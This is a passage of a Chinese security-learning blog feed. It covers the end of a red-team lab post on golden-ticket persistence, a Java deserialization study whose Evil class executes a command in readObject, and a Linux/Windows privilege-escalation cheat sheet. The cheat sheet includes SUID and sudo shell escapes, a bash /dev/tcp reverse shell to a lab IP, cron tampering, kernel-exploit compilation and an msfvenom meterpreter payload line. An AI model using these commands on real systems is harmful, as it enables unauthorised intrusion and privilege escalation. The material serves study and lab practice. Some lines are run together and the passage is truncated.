alt="image-20211006225714893" style="zoom:80%;"><img src="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image226.png" alt="image-20211006230321226" style="zoom:80%;"><h2 id="0x04-使用其他漏洞渗透"><a class="markdownIt-Anchor" href="#0x04-使用其他漏洞渗透"></a> 0x04 使用其他漏洞渗透</h2><p>​看网上说可以使用MS17010，加msf派生shell，后续测试</p><h2 id="0x05-权限维持知识"><a class="markdownIt-Anchor" href="#0x05-权限维持知识"></a> 0x05 权限维持(知识)</h2><p><strong>基本知识：</strong></p><p>做权限维持方式很多,粘滞键、启动项、影子用户等等。这次是拿到域控,这种情况下,黄金票据是一个很好的维权手段 黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><h3 id="黄金票据的条件要求"><a class="markdownIt-Anchor" href="#黄金票据的条件要求"></a> <strong>黄金票据的条件要求</strong>：</h3><p>1.域名称2.域的SID值3.域的KRBTGT账户NTLM密码哈希4.伪造用户名</p><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p><strong>也就是需要拿到域内KRBTGT账户，通常在DC上抓取密码</strong></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化学习与复现</title>
    <link href="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化学习与复现"><a class="markdownIt-Anchor" href="#java反序列化学习与复现"></a> java反序列化学习与复现</h1><h2 id="0x00-前言"><a class="markdownIt-Anchor" href="#0x00-前言"></a> 0x00 前言</h2><p>​最近面试被问到了，学长说那位是大佬，还问了二进制（好久没学了突然问二进制，没准备只能知道啥答啥了qaq，怕是寄了），奈何自己一直没去了解java反序列化，虽然挖到过shiro反序列化，但是没有去详细了解，不过我呢要学就是那种详细了解的，最近一直在学红队的技术（内网渗透，还看了冰蝎的魔改，frp的魔改，确实大佬们挺强），和实战挖洞，不多说先实际操作。</p><h2 id="0x01-基础知识参考各种博客"><a class="markdownIt-Anchor" href="#0x01-基础知识参考各种博客"></a> 0x01 基础知识（参考各种博客）</h2><p><strong>漏洞原理</strong><br>当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。</p><p><strong>Java反序列化操作</strong></p><p>实现方法<br>1.java.io.ObjectOutputStream<br>2.java.io.ObjectInputStream</p><p>序列化：ObjectOutputStream类 --&gt; writeObject()</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中<br>按Java的标准约定是给文件一个<span class="hljs-string">.ser</span>扩展名<br></code></pre></td></tr></table></figure><p>反序列化:　ObjectInputStream类 --&gt; readObject()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br></code></pre></td></tr></table></figure><p>感觉和php也有些相似hhhh</p><h2 id="0x02-实验测试"><a class="markdownIt-Anchor" href="#0x02-实验测试"></a> 0x02 实验测试</h2><h3 id="1简单实验"><a class="markdownIt-Anchor" href="#1简单实验"></a> 1.简单实验</h3><p>做一个简单的java反序列化实验，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java_Serializable;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">import java.io.ObjectOutputStream;</span><br><span class="hljs-comment">import java.io.ObjectInputStream;</span><br><span class="hljs-comment">import java.io.FileOutputStream;</span><br><span class="hljs-comment">import java.io.FileInputStream;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Java_Test</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String obj = <span class="hljs-string">&quot;zwz12138&quot;</span>;<br><br>        <span class="hljs-comment">// 话说我参考的文章这地方写的是object，但是文件名是aa.cer，2333</span><br>        <span class="hljs-comment">// 将序列化对象写入文件1.txt中</span><br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;1.txt&quot;</span>);<br>        ObjectOutputStream os = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>        os.writeObject(obj);<br>        os.close();<br><br>        <span class="hljs-comment">// 从文件1.txt中读取数据</span><br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;1.txt&quot;</span>);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br><br>        <span class="hljs-comment">// 通过反序列化恢复对象obj，传值给obj2</span><br>        String obj2 = (String)ois.readObject();<br>        System.out.println(obj2);<br>        ois.close();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>，说起来我也就学过假的java（手撕代码背书的那种），不过看着也还行，想起来某个文章说的</p><p><em>众所周知，Java代码开发与Java代码审计，并不是充分必要条件。</em></p><p><em>你问我懂不懂Java，那我当然是不懂的。</em></p><p><em>你问我能不能搞Java代码审计，其实也不是不能搞。</em></p><p>有一说一，好像确实hhhh</p><p>试了试，成功输出zwz12138</p><img src="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210930163001284.png" alt="image-20210930163001284" style="zoom:80%;"><p>十六进制看了看1.txt，十六进制编码长这样</p><img src="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210930152256931.png" alt="image-20210930152256931" style="zoom:80%;"><h3 id="2readobject方法重写测试"><a class="markdownIt-Anchor" href="#2readobject方法重写测试"></a> 2.readObject()方法重写测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代码Main.java</span><br><span class="hljs-keyword">package</span> java_Serializable;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Evil evil=<span class="hljs-keyword">new</span> Evil();<br>        evil.cmd=<span class="hljs-string">&quot;calc&quot;</span>;<br><br>        <span class="hljs-keyword">byte</span>[] serializeData=serialize(evil);<br>        unserialize(serializeData);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serialize(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        ByteArrayOutputStream btout = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objOut = <span class="hljs-keyword">new</span> ObjectOutputStream(btout);<br>        objOut.writeObject(obj);<br>        <span class="hljs-keyword">return</span> btout.toByteArray();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ByteArrayInputStream btin = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);<br>        ObjectInputStream objIn = <span class="hljs-keyword">new</span> ObjectInputStream(btin);<br>        <span class="hljs-keyword">return</span> objIn.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代码Evil.java</span><br><span class="hljs-keyword">package</span> java_Serializable;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream stream)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        stream.defaultReadObject();<br>        Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我看也看明白了，就是原先定义的evil对象中cmd值为calc，但是在反序列化中调用重新定义的readObject()方法，把cmd的值直接执行了，结果就是调起了windows的计算器，可见攻击要点就是这个反序列化方法</p><img src="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210930163435106.png" alt="image-20210930163435106" style="zoom:80%;"><h2 id="0x03-结合ctf题复现分析"><a class="markdownIt-Anchor" href="#0x03-结合ctf题复现分析"></a> 0x03 结合CTF题复现分析</h2><p>​这里准备结合一道java反序列化的题目进行研究，搭建环境复现，后续写。</p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux/Windows提权(方法以及命令记录/未复现)</title>
    <link href="/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <url>/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="linuxwindows提权方法以及命令记录未复现"><a class="markdownIt-Anchor" href="#linuxwindows提权方法以及命令记录未复现"></a> linux/Windows提权(方法以及命令记录/未复现)</h1><h2 id="1-linux提权"><a class="markdownIt-Anchor" href="#1-linux提权"></a> 1、Linux提权</h2><h3 id="11-基础信息收集"><a class="markdownIt-Anchor" href="#11-基础信息收集"></a> 1.1 基础信息收集</h3><h3 id="112-服务器信息收集"><a class="markdownIt-Anchor" href="#112-服务器信息收集"></a> 1.1.2 服务器信息收集</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、查看内核、操作系统、设备等信息<br>uname -a    打印所有可用的系统信息<br>uname -r    内核版本<br>uname -n    系统主机名。<br>uname -m    查看系统内核架构（<span class="hljs-number">64</span>位/<span class="hljs-number">32</span>位）<br>hostname    系统主机名<br>cat <span class="hljs-regexp">/proc/</span>version    内核信息<br>cat <span class="hljs-regexp">/etc/</span>*-release   分发信息<br>cat <span class="hljs-regexp">/etc/i</span>ssue       分发信息<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo    CPU信息<br><br>whoami              查看当前用户<br>w                   谁目前已登录，他们正在做什么<br>last                最后登录用户的列表<br>lastlog             所有用户上次登录的信息<br>lastlog –u %username%  有关指定用户上次登录的信息<br>lastlog |grep -v <span class="hljs-string">&quot;Never&quot;</span>  以前登录用户的完<br><br>查看用户和组、系统进程、计划任务、是否存在明文保存的密码等信息。<br>cat <span class="hljs-regexp">/etc/</span>passwd     列出系统上的所有用户<br>cat <span class="hljs-regexp">/etc/g</span>roup      列出系统上的所有组<br>grep -v -E <span class="hljs-string">&quot;^#&quot;</span> <span class="hljs-regexp">/etc/</span>passwd | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>      列出所有的超级用户账户<br><br>ps -ef | more   <span class="hljs-comment">#查看当前进程</span><br>ps -ef | grep root  <span class="hljs-comment">#查看以root权限运行的进程</span><br><br>crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | grep cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br><br>grep -i user [filename]   <span class="hljs-regexp">//</span>在文件中搜说user字段<br>grep -i pass [filename]   <span class="hljs-regexp">//</span>在文件中搜索pass字段<br>find , -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -<span class="hljs-number">0</span> grep -i -n <span class="hljs-string">&quot;var $password&quot;</span>    <span class="hljs-regexp">//</span>搜索以php结尾的文件中的pass内容<br><br>自动化信息收集脚本<br>LinEnum ==&gt; bash脚本<br>Github地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum.git<br>chomd <span class="hljs-number">777</span> LinEnum.sh<br>./LinEnum.sh &gt; <span class="hljs-number">1</span>.txt<br><br>Linuxprivchecker ==&gt; python脚本<br>Github地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sleventyeleven/</span>linuxprivchecker.git<br>chmod <span class="hljs-number">777</span> linuxprivchecker.py<br>python linuxprivchecker.py &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><h3 id="12-suid提权"><a class="markdownIt-Anchor" href="#12-suid提权"></a> 1.2 SUID提权</h3><p>为了设置漏洞环境，可将chmod u+s ，将一些程序手动设置成为suid</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<br><br>chmod u+s filename ==&gt; 添加SUID<br>chmod <span class="hljs-number">755</span> filename ==&gt; 移除SUID<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/hqhq</span><span class="hljs-comment"># ls -al /usr/bin | grep vim</span><br>-rwxr-xr-x  <span class="hljs-number">1</span> root root     <span class="hljs-number">884360</span> Jan  <span class="hljs-number">2</span>  <span class="hljs-number">2014</span> vim.tiny<br>root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/hqhq</span><span class="hljs-comment"># chmod u+s /usr/bin/vim.tiny</span><br></code></pre></td></tr></table></figure><p>查看SUID程序</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>SUID提权</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap   <span class="hljs-regexp">//</span>低版本还需测试<br>echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.nse &amp;&amp; nmap --script=<span class="hljs-regexp">/tmp/</span>shell.nse<br><br>find<br>touch testtest<br>find testtest -exec whoami \;<br><br>vim.tiny    <span class="hljs-regexp">//</span>低版本还需测试<br>打开vim.tiny,按下ESC<br>:set shell=<span class="hljs-regexp">/bin/</span>sh<br>:shell<br><br>bash ==&gt; <span class="hljs-regexp">/bin/</span>bash<br>bash -p<br><br>sh<br></code></pre></td></tr></table></figure><h3 id="13-内核漏洞提权"><a class="markdownIt-Anchor" href="#13-内核漏洞提权"></a> 1.3 内核漏洞提权</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用获取到的内核信息可通过以下方式搜索相关利用程序。<br><span class="hljs-number">1</span>、site:exploit-db.com <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">327</span>.el7.x86_64    <span class="hljs-regexp">//</span>centos系统<br><span class="hljs-number">2</span>、searchsploit privilege | grep -i linux | grep -i kernel | grep <span class="hljs-number">3.10</span><br>searchsploit位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<br>根据已有的漏洞编译执行即可。<br><br>公开的内核漏洞：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>linux-kernel-exploits<br>linux-exploit-suggester.sh ==&gt; 该脚本可自动搜集系统内部漏洞<br><br>gcc <span class="hljs-number">40616</span>.c -o <span class="hljs-number">40616</span> -pthread    <span class="hljs-regexp">//</span>centos利用成功<br>./<span class="hljs-number">40616</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">还需添加一个Ubuntu的提权<br><br></code></pre></td></tr></table></figure><h3 id="14-sudo"><a class="markdownIt-Anchor" href="#14-sudo"></a> 1.4 sudo</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo vim.tiny -c<span class="hljs-string">&#x27;!sh&#x27;</span><br><br>sudo more <span class="hljs-number">123</span><br>!<span class="hljs-regexp">/bin/</span>bash<br><br><br>echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell2.nse &amp;&amp; sudo nmap --script=<span class="hljs-regexp">/tmp/</span>shell2.nse<br><br><br>sudo man man<br>!<span class="hljs-regexp">/bin/</span>bash<br><br><br>sudo vi<br>:!bash<br><br><br>sudo git help status <br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h3 id="15-计划任务提权"><a class="markdownIt-Anchor" href="#15-计划任务提权"></a> 1.5 计划任务提权</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">计划任务存放位置：<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>etc<span class="hljs-regexp">/crontab/</span>etc<span class="hljs-regexp">/cron.d环境变量提权cat /</span>etc<span class="hljs-regexp">/crontabbash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192.168</span>.<span class="hljs-number">229.129</span><span class="hljs-regexp">/9898 0&gt;&amp;1Crontab文件重写提权1、创建垃圾文件echo “testtesttest1” &gt; 1.txtecho “testtesttest2” &gt; 2.txt2、编写删除垃圾文件脚本#!/u</span>sr<span class="hljs-regexp">/bin/</span>env pythonimport osimport systry:    os.system(<span class="hljs-string">&#x27;rm -r /home/kali/testaaa/*&#x27;</span>)except:    sys.<span class="hljs-keyword">exit</span>()<span class="hljs-number">3</span>、计划任务中执行定时删除脚本vim <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/1 * * * *   root   python /</span>tmp<span class="hljs-regexp">/clear.py4、修改批量执行脚本#!/u</span>sr<span class="hljs-regexp">/bin/</span>env pythonimport osimport systry:    os.system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>)except:    sys.<span class="hljs-keyword">exit</span>()<br></code></pre></td></tr></table></figure><h2 id="2-windows提权"><a class="markdownIt-Anchor" href="#2-windows提权"></a> 2、Windows提权</h2><h3 id="21-基础信息收集"><a class="markdownIt-Anchor" href="#21-基础信息收集"></a> 2.1 基础信息收集</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">systeminfo    查询系统信息systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本“    查看systeminfo中特定的信息Hostname     主机名<span class="hljs-keyword">Set</span>    环境变量<span class="hljs-keyword">Net</span> user   查看用户信息Tasklist /svc   查询服务的pid号wmic os get caption    查看系统名wmic qfe get Description,HotFixID,InstalledOn    查看补丁信息wmic qfe get Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KB4346084&quot;</span> /C:&quot;KB4509094“wmic product get name,<span class="hljs-keyword">version</span>     查看当前安装程序whoami /priv当前帐户权限 ipconfig /displaydns显示DNS缓存route <span class="hljs-keyword">print</span>打印出路由表<span class="hljs-keyword">net</span> user UserName关于用户的信息<span class="hljs-keyword">net</span> localgroup GROUP关于指定组的信息netsh firewall show config显示防火墙配置<span class="hljs-keyword">net</span> start列出启动的服务<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span>列出所有服务<span class="hljs-keyword">sc</span> qc ServiceName找到指定服务的路径icacls “C:\Example”列出文件权限<br></code></pre></td></tr></table></figure><h3 id="22-内核漏洞提权"><a class="markdownIt-Anchor" href="#22-内核漏洞提权"></a> 2.2 内核漏洞提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 8">通过以下两条命令可快速查看本地系统补丁：systeminfo | findstr “KB”wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><h3 id="221-寻找exp"><a class="markdownIt-Anchor" href="#221-寻找exp"></a> 2.2.1 寻找exp</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span>-kernel-exploits项目中有一个python脚本将可以将systeminfo中的信息和微软的安全公告数据对比找出合适的exp。Github地址：https://github.com/SecWiki/windows-kernel-exploits/blob/master/win-exp-suggester/windows-exploit-suggester.pypython<span class="hljs-number">2</span>脚本使用方式：通过pip安装xlrd模块，建议安装<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>版本，高版本不支持打开xlsx文件。python<span class="hljs-number">2</span>的pip<span class="hljs-number">2</span>.exe安装。当前目录下还需要systeminfo.txtpip<span class="hljs-number">2</span> install xlrd==<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>windows-exploit-suggester.py –update   (python<span class="hljs-number">2</span>)windows-exploit-suggester.py -d <span class="hljs-number">2021</span>-<span class="hljs-number">05</span>-<span class="hljs-number">24</span>-mssb.xls --systeminfo systeminfo.txt利用cmd指令将systeminfo中的补丁和公开的补丁做对比。systeminfo&gt;systeminfo.txt&amp;(for %i in ( KB<span class="hljs-number">977165</span> KB<span class="hljs-number">2160329</span> KB<span class="hljs-number">2503665</span> KB<span class="hljs-number">2592799</span> KB<span class="hljs-number">2707511</span> KB<span class="hljs-number">2829361</span> KB<span class="hljs-number">2850851</span> KB<span class="hljs-number">3000061</span> KB<span class="hljs-number">3045171</span> KB<span class="hljs-number">3077657</span> KB<span class="hljs-number">3079904</span> KB<span class="hljs-number">3134228</span> KB<span class="hljs-number">3143141</span> KB<span class="hljs-number">3141780</span> ) do @type systeminfo.txt|@find /i <span class="hljs-string">&quot;%i&quot;</span>|| @echo %i you can fuck)&amp;del /f /q /a systeminfo.txt<br></code></pre></td></tr></table></figure><h3 id="222-ms14-058"><a class="markdownIt-Anchor" href="#222-ms14-058"></a> 2.2.2 ms14-058</h3><h4 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>qhq<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>q<span class="hljs-symbol">\M</span>S14-058<span class="hljs-symbol">\C</span>VE-2014-4113-Exploit&gt;Win64.exe whoamint authority<span class="hljs-symbol">\s</span>ystem<br></code></pre></td></tr></table></figure><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> msf</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">生成exemsfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp -e x86<span class="hljs-regexp">/shikata_ga_nai -i 5 lhost=192.168.229.129 lport=7777 -f exe &gt; /</span>home<span 